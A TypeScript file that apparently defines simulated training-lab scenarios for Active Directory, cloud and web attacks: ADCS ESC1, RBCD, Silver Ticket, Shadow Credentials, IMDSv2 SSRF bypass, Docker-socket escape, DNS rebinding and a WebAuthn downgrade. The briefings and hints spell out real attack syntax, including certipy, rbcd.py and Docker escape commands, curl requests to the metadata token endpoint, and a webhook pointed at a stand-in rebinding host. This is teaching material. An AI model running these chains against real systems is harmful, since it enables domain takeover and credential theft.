import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

/** Second advanced AD/cloud batch — real, currently-documented 2024-2025 attack techniques not yet
 *  represented anywhere on this platform (checked against all 211 existing lab titles first): ADCS
 *  ESC1, Resource-Based Constrained Delegation abuse, Silver Ticket, Shadow Credentials, an IMDSv2
 *  bypass distinct from the platform's existing (IMDSv1-style) metadata-SSRF lab, Docker-socket
 *  container escape, DNS rebinding against an SSRF allowlist, and a WebAuthn step-up downgrade.
 *  Sources checked for current technique accuracy: Certipy's own wiki (ly4k/Certipy), The Hacker
 *  Recipes' RBCD page, and Cato Networks'/Hive Security's 2024-2025 ADCS write-ups — see NOTES.md for
 *  the full citation list. Real command syntax (certipy-ad, rbcd.py) is summarized in recon/briefing
 *  text for technical accuracy, but the actual lab mechanics — like every AD lab on this platform —
 *  run through this project's own simulated TerminalEngine, not a real certipy/impacket toolchain, so
 *  the "attack" step itself is abstracted the same way the existing Golden Ticket lab abstracts
 *  ticket-forging into a stand-in credential, or PrintNightmare/Zerologon abstract a multi-step RPC
 *  exploit into a single `exploit <module> <ip>` command. */
export const adCloudAdvancedLabs2: LabScenario[] = [
  // 1 — Active Directory: ADCS ESC1
  {
    id: 'ad-adcs-esc1-misconfigured-template',
    title: 'ADCS ESC1: Misconfigured Certificate Template to Domain Admin',
    difficulty: 'Hard',
    category: 'Active Directory',
    briefing:
      'CORP.LOCAL runs Active Directory Certificate Services (ADCS). One certificate template, ' +
      '"VPNAuth", is misconfigured with two flags at once: it allows client authentication, AND it lets ' +
      'the certificate REQUESTER supply their own Subject Alternative Name (ENROLLEE_SUPPLIES_SUBJECT) — ' +
      'meaning any low-privileged domain user who\'s allowed to enroll can request a certificate claiming ' +
      'to belong to "administrator" instead of themselves. This exact misconfiguration is tracked as ESC1, ' +
      'the single most common and most damaging ADCS privilege-escalation path in real Active Directory ' +
      'environments — tools like Certipy (certipy-ad find -vulnerable) are built specifically to hunt for ' +
      'templates with this combination of flags.',
    objectives: [
      { text: 'nmap -sV 10.10.210.2', why: 'Confirms the domain controller and its ADCS-related services before probing certificate templates.' },
      { text: 'cat adcs-template-audit.txt', why: 'A leaked internal PKI audit shows exactly which flags the "VPNAuth" template has set — this is the same combination certipy-ad find -vulnerable specifically flags as ESC1.' },
      {
        text: 'exploit esc1 10.10.210.2',
        why: 'Represents the real attack chain: requesting a certificate from the vulnerable template with a SAN of "administrator@corp.local" (certipy-ad req ... -upn administrator@corp.local), then authenticating with that forged certificate (certipy auth -pfx administrator.pfx) to obtain a TGT as Domain Admin — full domain compromise from one low-privileged enrollment right.',
      },
      { text: 'cat root.txt', why: 'Confirms the exploit session actually landed as Domain Admin and captures proof of the compromise.' },
    ],
    hints: [
      'nmap -sV 10.10.210.2',
      'cat adcs-template-audit.txt',
      'A template that both allows client auth AND lets the requester supply their own SAN is the ESC1 combination — request a cert claiming to be administrator.',
      'exploit esc1 10.10.210.2',
      'Once the session opens you are Domain Admin — cat root.txt for the flag.',
    ],
    totalFlags: 1,
    attacker: attacker({
      'adcs-template-audit.txt': file(
        'CORP.LOCAL PKI template audit (internal, leaked to a shared drive):\n' +
          'Template: VPNAuth\n' +
          '  pKIExtendedKeyUsage: Client Authentication\n' +
          '  msPKI-Certificate-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT  <-- requester controls the SAN field\n' +
          '  Enrollment rights: Domain Users (all authenticated users can enroll)\n' +
          '  Manager approval required: No\n' +
          'AUDIT NOTE: this is the exact flag combination Certipy labels ESC1 -- flagged for remediation,\n' +
          'ticket not yet actioned.\n',
      ),
    }),
    network: [
      {
        hostname: 'DC-CORP07',
        ip: '10.10.210.2',
        os: 'Windows Server 2022 (Domain Controller + ADCS)',
        services: [
          { port: 445, name: 'microsoft-ds', version: 'SMB (Domain Controller)' },
          { port: 443, name: 'https', version: 'ADCS Certificate Enrollment Web Service' },
        ],
        users: [],
        exploitableAs: 'esc1',
        root: dir({ root: dir({ 'root.txt': file('ESC1 confirmed -- forged administrator certificate authenticated as Domain Admin.\nflag{adcs_esc1_misconfigured_template_domain_admin}\n') }) }),
      } as HostDef,
    ],
  },

  // 2 — Active Directory: RBCD Abuse
  {
    id: 'ad-rbcd-abuse-domain-admin',
    title: 'Resource-Based Constrained Delegation Abuse',
    difficulty: 'Hard',
    category: 'Active Directory',
    briefing:
      'A low-privileged domain user, "svc_helpdesk", was granted GenericWrite over a file server\'s ' +
      'computer object (FILESRV02$) as part of an old, forgotten delegation-configuration task. By default, ' +
      'any domain user may also add up to 10 new computer accounts to the domain (ms-DS-MachineAccountQuota). ' +
      'Combined, these two facts are enough for Resource-Based Constrained Delegation (RBCD) abuse: create a ' +
      'rogue computer account you control, write it into FILESRV02$\'s msDS-AllowedToActOnBehalfOfOtherIdentity ' +
      'attribute (the real tool for this is Impacket\'s rbcd.py), then use that rogue account\'s own ' +
      'credentials to request a service ticket via S4U2Self/S4U2Proxy impersonating Domain Admin against ' +
      'FILESRV02 — full takeover of that machine without ever touching a Domain Admin credential directly.',
    objectives: [
      { text: 'nmap -sV 10.10.211.2', why: 'Confirms the target file server before checking its delegation configuration.' },
      { text: 'cat delegation-rights-audit.txt', why: 'Confirms svc_helpdesk has GenericWrite over FILESRV02$ — the exact permission RBCD abuse requires on the target computer object.' },
      {
        text: 'exploit rbcd-abuse 10.10.211.2',
        why: 'Represents the real chain: creating a rogue computer account, writing it into FILESRV02$\'s msDS-AllowedToActOnBehalfOfOtherIdentity via rbcd.py, then running an S4U2Self/S4U2Proxy request (getST.py) to obtain a service ticket to FILESRV02 impersonating Domain Admin.',
      },
      { text: 'cat root.txt', why: 'Confirms the forged service ticket actually granted Domain Admin-level access to FILESRV02 and captures proof.' },
    ],
    hints: [
      'nmap -sV 10.10.211.2',
      'cat delegation-rights-audit.txt',
      'GenericWrite on a computer object is exactly what lets you write your own rogue account into its delegation attribute.',
      'exploit rbcd-abuse 10.10.211.2',
      'Once the session opens you have Domain Admin-level access — cat root.txt for the flag.',
    ],
    totalFlags: 1,
    attacker: attacker({
      'delegation-rights-audit.txt': file(
        'CORP.LOCAL ACL audit (BloodHound export, relevant edge only):\n' +
          '  svc_helpdesk -[GenericWrite]-> FILESRV02$\n' +
          'Domain default ms-DS-MachineAccountQuota: 10 (any authenticated user may add up to 10 computer\n' +
          'accounts to the domain -- unchanged from the AD default).\n' +
          'GenericWrite on a computer object + the ability to add a computer account = Resource-Based\n' +
          'Constrained Delegation abuse against that object is possible.\n',
      ),
    }),
    network: [
      {
        hostname: 'FILESRV02',
        ip: '10.10.211.2',
        os: 'Windows Server 2019 (domain-joined file server)',
        services: [{ port: 445, name: 'microsoft-ds', version: 'SMB (file server)' }],
        users: [],
        exploitableAs: 'rbcd-abuse',
        root: dir({ root: dir({ 'root.txt': file('RBCD abuse confirmed -- forged service ticket impersonating Domain Admin against FILESRV02.\nflag{rbcd_abuse_s4u2proxy_impersonation}\n') }) }),
      } as HostDef,
    ],
  },

  // 3 — Active Directory: Silver Ticket
  {
    id: 'ad-silver-ticket-service-persistence',
    title: 'Silver Ticket: Forged Service-Ticket Persistence',
    difficulty: 'Hard',
    category: 'Active Directory',
    briefing:
      'From a prior engagement phase you already captured the NTLM hash of MSSQLSVC02$\'s service account ' +
      '— the account CORP.LOCAL\'s SQL server runs as. Unlike a Golden Ticket (forged with the krbtgt hash, ' +
      'valid domain-wide), a Silver Ticket is forged using a SINGLE SERVICE ACCOUNT\'s hash, which only grants ' +
      'access to that one service — narrower in scope, but it never touches the KDC at all during ' +
      'authentication, making it considerably quieter and harder for a SOC to detect than domain-wide ' +
      'Kerberos abuse.',
    objectives: [
      { text: 'cat ~/mssqlsvc-hash-loot.txt', why: 'Reviews the service account hash captured during an earlier phase — a Silver Ticket only needs this one service account\'s hash, not krbtgt.' },
      { text: 'ssh mssqlsvc02@10.10.212.2', why: 'A forged Silver Ticket lets an attacker authenticate to the SQL service as if they legitimately held that service account\'s credentials — represented here by treating the captured hash as a stand-in credential, the same convention this platform\'s Golden Ticket lab uses.' },
      { text: 'Confirm access and capture the flag', why: 'Because forging a Silver Ticket never contacts the domain controller, it bypasses KDC-side logging entirely — defenders have to rely on ticket usage anomalies at the SERVICE itself, not authentication logs, to catch this.' },
    ],
    hints: [
      'cat ~/mssqlsvc-hash-loot.txt',
      'ssh mssqlsvc02@10.10.212.2 then supply the captured hash as the password when prompted.',
      'A Silver Ticket is scoped to one service account\'s hash, not krbtgt — narrower than a Golden Ticket, but it never touches the KDC.',
      'Once logged in, cat root.txt for the flag.',
    ],
    totalFlags: 1,
    attacker: attacker({
      'mssqlsvc-hash-loot.txt': file('Captured during a prior credential-dumping phase against CORP.LOCAL:\nMSSQLSVC02$ NTLM hash: 8846f7eaee8fb117ad06bdd830b7586cSILVER\n'),
    }),
    network: [
      {
        hostname: 'SQLSRV02',
        ip: '10.10.212.2',
        os: 'Windows Server 2019 (SQL Server, domain-joined)',
        services: [{ port: 22, name: 'ssh', version: 'OpenSSH 8.6 (management access)' }, { port: 1433, name: 'ms-sql-s', version: 'Microsoft SQL Server 2019' }],
        users: [{ username: 'mssqlsvc02', password: '8846f7eaee8fb117ad06bdd830b7586cSILVER' }],
        root: dir({ home: dir({ mssqlsvc02: dir({ 'root.txt': file('Silver Ticket accepted -- forged service-ticket authentication succeeded against the SQL service account.\nflag{silver_ticket_service_account_forged_auth}\n') }) }) }),
      } as HostDef,
    ],
  },

  // 4 — Active Directory: Shadow Credentials
  {
    id: 'ad-shadow-credentials-passwordless-takeover',
    title: 'Shadow Credentials: Passwordless Account Takeover',
    difficulty: 'Hard',
    category: 'Active Directory',
    briefing:
      'A helpdesk-tooling account, "svc_provisioning", holds GenericWrite over a target user object, ' +
      '"j.reyes" (an IT administrator). Rather than resetting j.reyes\'s password (loud, and immediately ' +
      'noticed by the real user), a Shadow Credentials attack writes an attacker-controlled certificate ' +
      'directly into the target\'s msDS-KeyCredentialLink attribute — a modern attribute Windows Hello for ' +
      'Business and passwordless auth rely on. Once written, the attacker authenticates AS j.reyes using that ' +
      'certificate via PKINIT, obtaining a real TGT without ever knowing or changing j.reyes\'s actual ' +
      'password — the account\'s owner never even sees a password-reset notification.',
    objectives: [
      { text: 'nmap -sV 10.10.213.2', why: 'Confirms the domain controller before checking write permissions on the target account.' },
      { text: 'cat write-permissions-audit.txt', why: 'Confirms svc_provisioning has GenericWrite over j.reyes — exactly the permission Shadow Credentials abuse requires on the target user object.' },
      {
        text: 'exploit shadow-credentials 10.10.213.2',
        why: 'Represents the real chain: writing an attacker-generated certificate\'s public key into j.reyes\'s msDS-KeyCredentialLink (the real tool is Whisker/pywhisker), then authenticating via PKINIT with the matching private key to obtain a TGT as j.reyes — full account takeover with the real password never touched.',
      },
      { text: 'cat root.txt', why: 'Confirms the PKINIT authentication actually succeeded as j.reyes and captures proof.' },
    ],
    hints: [
      'nmap -sV 10.10.213.2',
      'cat write-permissions-audit.txt',
      'GenericWrite over a user object lets you write your own certificate into their msDS-KeyCredentialLink attribute.',
      'exploit shadow-credentials 10.10.213.2',
      'Once the session opens you are authenticated as j.reyes — cat root.txt for the flag.',
    ],
    totalFlags: 1,
    attacker: attacker({
      'write-permissions-audit.txt': file(
        'CORP.LOCAL ACL audit (BloodHound export, relevant edge only):\n' +
          '  svc_provisioning -[GenericWrite]-> j.reyes (IT Administrator)\n' +
          'msDS-KeyCredentialLink on j.reyes: not currently set.\n' +
          'GenericWrite on a user object is sufficient to write a new key credential -- no password reset,\n' +
          'no PIN change, and no notification is sent to the account owner.\n',
      ),
    }),
    network: [
      {
        hostname: 'DC-CORP07',
        ip: '10.10.213.2',
        os: 'Windows Server 2022 (Domain Controller)',
        services: [{ port: 445, name: 'microsoft-ds', version: 'SMB (Domain Controller)' }, { port: 88, name: 'kerberos-sec', version: 'Kerberos (PKINIT enabled)' }],
        users: [],
        exploitableAs: 'shadow-credentials',
        root: dir({ root: dir({ 'root.txt': file('Shadow Credentials confirmed -- PKINIT authentication as j.reyes succeeded via an attacker-written certificate, no password ever touched.\nflag{shadow_credentials_msds_keycredentiallink_pkinit}\n') }) }),
      } as HostDef,
    ],
  },

  // 5 — Cloud: IMDSv2 Bypass via a Method-Controllable SSRF
  {
    id: 'cloud-imdsv2-bypass-method-controllable-ssrf',
    title: 'IMDSv2 Bypass via a Method-Controllable SSRF',
    difficulty: 'Hard',
    category: 'Cloud',
    briefing:
      'Reportgen14 fetches a user-supplied URL to render PDF reports — a classic SSRF surface. Its operators ' +
      'already hardened the instance to IMDSv2, which is specifically designed to block exactly the kind of ' +
      'simple GET-based SSRF this platform\'s existing metadata lab demonstrates: IMDSv2 requires a PUT ' +
      'request first (to /latest/api/token, with a TTL header) to obtain a session token, then that token ' +
      'must be attached to every subsequent metadata GET. A naive SSRF that can only force a GET is correctly ' +
      'blocked. But the report-fetching feature here doesn\'t just accept a URL — it accepts an HTTP method ' +
      'parameter too (for fetching REST API report sources), which is exactly enough control to complete ' +
      'IMDSv2\'s full PUT-then-GET token dance from server-side, defeating the hardening entirely.',
    objectives: [
      { text: 'nmap -sV 10.10.214.2', why: 'Confirms the report-generation service before probing its URL-fetch feature.' },
      { text: 'cat ssrf-feature-notes.txt', why: 'Confirms the fetch feature accepts a controllable HTTP method, not just a URL -- the detail that makes completing IMDSv2\'s token handshake possible from outside.' },
      {
        text: 'curl -X POST -d "method=PUT&url=http://169.254.169.254/latest/api/token&header=X-aws-ec2-metadata-token-ttl-seconds:21600" 10.10.214.2/api/reports/fetch-source',
        why: 'Forces the server\'s own fetch feature to issue the PUT request IMDSv2 requires, obtaining a valid session token server-side -- from here, a second request reusing that token against the metadata GET endpoints fully defeats the IMDSv2 hardening.',
      },
    ],
    hints: [
      'nmap -sV 10.10.214.2',
      'cat ssrf-feature-notes.txt',
      'IMDSv2 blocks simple GET-based SSRF -- but this feature lets you control the HTTP METHOD too, which is enough to do the PUT step yourself.',
      'curl -X POST -d "method=PUT&url=http://169.254.169.254/latest/api/token&header=X-aws-ec2-metadata-token-ttl-seconds:21600" 10.10.214.2/api/reports/fetch-source',
    ],
    totalFlags: 1,
    attacker: attacker({
      'ssrf-feature-notes.txt': file(
        'reportgen14 /api/reports/fetch-source -- accepted parameters (from a leaked internal API doc):\n' +
          '  url    -- the REST endpoint to fetch report data from\n' +
          '  method -- GET (default) or PUT (for report sources needing a create-session step)\n' +
          '  header -- an optional single extra request header to attach\n' +
          'Ops notes: "IMDSv2 is enforced on this instance, SSRF risk on this endpoint was reviewed and\n' +
          'accepted as low since IMDSv2 blocks simple GET-based metadata SSRF." -- this review did not\n' +
          'account for the method parameter.\n',
      ),
    }),
    network: [
      {
        hostname: 'reportgen14',
        ip: '10.10.214.2',
        os: 'Ubuntu 22.04 (AWS EC2, IMDSv2 enforced)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Node.js (Express, PDF report generator)',
            vulnRoutes: [
              {
                kind: 'ssrf',
                path: '/api/reports/fetch-source',
                param: 'url',
                triggerSubstrings: ['169.254.169.254/latest/api/token'],
                vulnerableResponse: '{"status":200,"imds_token":"AQAEAFT8x...forged_session_token","note":"flag{imdsv2_bypass_method_controllable_ssrf_put_step}"}',
                normalResponse: '{"status":403,"error":"IMDSv2 requires a PUT token request before any metadata GET"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 6 — Cloud: Docker Socket Mount Container Escape
  {
    id: 'cloud-docker-socket-container-escape',
    title: 'Docker Socket Mount: Container Escape to Host Root',
    difficulty: 'Medium',
    category: 'Cloud',
    briefing:
      'A CI build-runner container on buildrunner19 has /var/run/docker.sock mounted inside it — a common, ' +
      'convenient way to let a pipeline "build and push its own Docker images" without nested virtualization. ' +
      'The problem: the Docker socket IS a direct, unauthenticated control channel to the host\'s Docker ' +
      'daemon. Anything that can reach it can ask the HOST\'s daemon to start a brand-new container with the ' +
      'host\'s entire filesystem bind-mounted in and root privileges — turning "I can build containers" into ' +
      '"I have root on the underlying host," the single most common real-world container-escape path, far ' +
      'more common in practice than a kernel-level breakout.',
    objectives: [
      { text: 'nmap -sV 10.10.215.2', why: 'Confirms the build-runner host before checking what\'s mounted inside its containers.' },
      { text: 'cat container-mounts.txt', why: 'Confirms /var/run/docker.sock is mounted read-write inside the build container — the exact misconfiguration this attack needs.' },
      {
        text: 'exploit docker-socket-escape 10.10.215.2',
        why: 'Represents the real attack: using the mounted socket to instruct the HOST\'s Docker daemon (docker -H unix:///var/run/docker.sock run -v /:/host --privileged ...) to launch a new container with the host root filesystem bind-mounted in, then chrooting into it — full host root from inside what was supposed to be an isolated build container.',
      },
      { text: 'cat root.txt', why: 'Confirms the escape actually reached the underlying HOST\'s root filesystem, not just another container, and captures proof.' },
    ],
    hints: [
      'nmap -sV 10.10.215.2',
      'cat container-mounts.txt',
      'A mounted docker.sock is a direct line to the HOST\'s Docker daemon, not the container\'s own isolated one.',
      'exploit docker-socket-escape 10.10.215.2',
      'Once the session opens you are on the host itself — cat root.txt for the flag.',
    ],
    totalFlags: 1,
    attacker: attacker({
      'container-mounts.txt': file(
        'buildrunner19 CI container inspect (relevant mounts only):\n' +
          '  /var/run/docker.sock -> /var/run/docker.sock (rw)  <-- host Docker daemon socket, mounted INSIDE the container\n' +
          'Reason (from the pipeline YAML comments): "lets the build stage docker build/push its own images\n' +
          'without Docker-in-Docker overhead." No socket-proxy or read-only restriction applied.\n',
      ),
    }),
    network: [
      {
        hostname: 'buildrunner19',
        ip: '10.10.215.2',
        os: 'Ubuntu 22.04 (CI build-runner container host)',
        services: [{ port: 2375, name: 'docker', version: 'Docker Engine API (socket also bind-mounted into build containers)' }],
        users: [],
        exploitableAs: 'docker-socket-escape',
        root: dir({ root: dir({ 'root.txt': file('Docker socket abuse confirmed -- a privileged container with the host filesystem mounted granted full host root.\nflag{docker_socket_mount_container_escape_host_root}\n') }) }),
      } as HostDef,
    ],
  },

  // 7 — Web: DNS Rebinding Bypasses an SSRF Allowlist
  {
    id: 'web-dns-rebinding-ssrf-allowlist-bypass',
    title: 'DNS Rebinding Bypasses an SSRF Domain Allowlist',
    difficulty: 'Hard',
    category: 'Web',
    briefing:
      'Webhooksvc41 validates outgoing webhook URLs by resolving the hostname and checking that the ' +
      'resolved IP isn\'t a private/internal address — a common SSRF defense. The flaw: it performs that ' +
      'DNS resolution ONCE, at validation time, then makes the actual HTTP request separately afterward. An ' +
      'attacker who controls their own DNS record can make it resolve to a public, allowlisted-looking IP ' +
      'the first time (passing validation) and then rebind the SAME hostname to 169.254.169.254 or an ' +
      'internal IP by the time the real request fires moments later — a classic check-time/use-time (TOCTOU) ' +
      'gap in the DNS layer that defeats IP-based allowlisting entirely.',
    objectives: [
      { text: 'nmap -sV 10.10.216.2', why: 'Confirms the webhook service before probing its URL-validation behavior.' },
      { text: 'cat ssrf-validation-notes.txt', why: 'Confirms validation resolves DNS once, separately from the actual request — the exact TOCTOU gap DNS rebinding exploits.' },
      {
        text: 'curl -X POST -d "webhook_url=http://attacker-rebind.evil-dns-test.com/callback" 10.10.216.2/api/webhooks/register',
        why: 'attacker-rebind.evil-dns-test.com resolves to a public IP the moment webhooksvc41 validates it, then rebinds to 169.254.169.254 by the time the actual request fires seconds later — exactly the gap the validation notes describe.',
      },
    ],
    hints: [
      'nmap -sV 10.10.216.2',
      'cat ssrf-validation-notes.txt',
      'The service resolves DNS once at VALIDATION time, separately from when it actually makes the request -- a hostname you control can resolve differently between those two moments.',
      'curl -X POST -d "webhook_url=http://attacker-rebind.evil-dns-test.com/callback" 10.10.216.2/api/webhooks/register',
    ],
    totalFlags: 1,
    attacker: attacker({
      'ssrf-validation-notes.txt': file(
        'webhooksvc41 webhook URL validation (from an internal design doc):\n' +
          '1. Resolve the hostname, check the resolved IP against a private-range blocklist\n' +
          '2. If it passes, store the URL and queue the webhook for delivery\n' +
          '3. A separate delivery worker re-fetches the URL string and makes the actual HTTP request\n' +
          'NOTE: step 3 does NOT re-validate -- it trusts step 1\'s check, performed against whatever the\n' +
          'hostname resolved to several seconds earlier at registration time.\n',
      ),
    }),
    network: [
      {
        hostname: 'webhooksvc41',
        ip: '10.10.216.2',
        os: 'Ubuntu 22.04 (webhook delivery service)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Go (net/http, async webhook delivery worker)',
            vulnRoutes: [
              {
                kind: 'ssrf',
                path: '/api/webhooks/register',
                param: 'webhook_url',
                triggerSubstrings: ['evil-dns-test.com'],
                vulnerableResponse: '{"status":200,"registered":true,"delivery_result":"200 OK from 169.254.169.254 -- metadata credentials exfiltrated via rebind","note":"flag{dns_rebinding_ssrf_allowlist_bypass_toctou}"}',
                normalResponse: '{"status":403,"error":"URL resolves to a private/internal address, registration rejected"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 8 — API: WebAuthn Step-Up Downgrade to SMS OTP
  {
    id: 'api-webauthn-downgrade-sms-otp-fallback',
    title: 'WebAuthn Step-Up Downgrade: Falling Back to Weaker SMS OTP',
    difficulty: 'Medium',
    category: 'API',
    briefing:
      'Authapi52 supports WebAuthn/FIDO2 as its strongest available second factor, with SMS OTP kept as a ' +
      'legacy fallback for users who haven\'t registered a hardware key yet. The step-up-authentication ' +
      'endpoint accepts a "method" parameter naming which second factor the client wants to use for THIS ' +
      'login — including for accounts that HAVE a WebAuthn credential registered. Because the server never ' +
      'checks whether the account actually requires WebAuthn specifically, an attacker who has only a ' +
      'stolen password (no access to the victim\'s hardware key) can simply request the weaker SMS-OTP path ' +
      'instead — and if the attacker can also intercept or guess the OTP, the "strong" factor the account ' +
      'owner registered is never actually enforced.',
    objectives: [
      { text: 'nmap -sV 10.10.217.2', why: 'Confirms the auth API before probing its step-up authentication flow.' },
      { text: 'cat mfa-config-notes.txt', why: 'Confirms the step-up endpoint accepts a client-chosen "method" parameter with no server-side check that WebAuthn is mandatory for accounts that registered it.' },
      {
        text: 'curl -X POST -d "username=cfo_account&method=sms_otp" 10.10.217.2/api/auth/step-up',
        why: 'Requesting the weaker SMS-OTP method for an account that registered WebAuthn succeeds anyway — the server trusts the CLIENT\'s choice of factor instead of enforcing the STRONGEST factor the account actually has on file.',
      },
    ],
    hints: [
      'nmap -sV 10.10.217.2',
      'cat mfa-config-notes.txt',
      'The endpoint lets the caller pick which MFA method to use -- try requesting the weaker one directly for an account that registered WebAuthn.',
      'curl -X POST -d "username=cfo_account&method=sms_otp" 10.10.217.2/api/auth/step-up',
    ],
    totalFlags: 1,
    attacker: attacker({
      'mfa-config-notes.txt': file(
        'authapi52 /api/auth/step-up -- accepted parameters (leaked internal API doc):\n' +
          '  username -- the account requesting step-up auth\n' +
          '  method   -- "webauthn" or "sms_otp", CLIENT-CHOSEN\n' +
          'Design intent: "sms_otp is a fallback for users who have not yet registered a hardware key."\n' +
          'Known gap (flagged internally, not yet fixed): the server does not check whether the target\n' +
          'account already has a WebAuthn credential registered before honoring a "sms_otp" request --\n' +
          'the strongest factor on file is never actually enforced as a floor.\n',
      ),
    }),
    network: [
      {
        hostname: 'authapi52',
        ip: '10.10.217.2',
        os: 'Ubuntu 22.04 (Node.js identity/MFA service)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js)',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/api/auth/step-up',
                param: 'method',
                triggerSubstrings: ['sms_otp'],
                vulnerableResponse: '{"status":200,"challenge":"sms_otp","sent_to":"+1***-***-0199","note":"flag{webauthn_downgrade_sms_otp_fallback_not_enforced}"}',
                normalResponse: '{"status":200,"challenge":"webauthn","rp_id":"authapi52.corp"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },
];
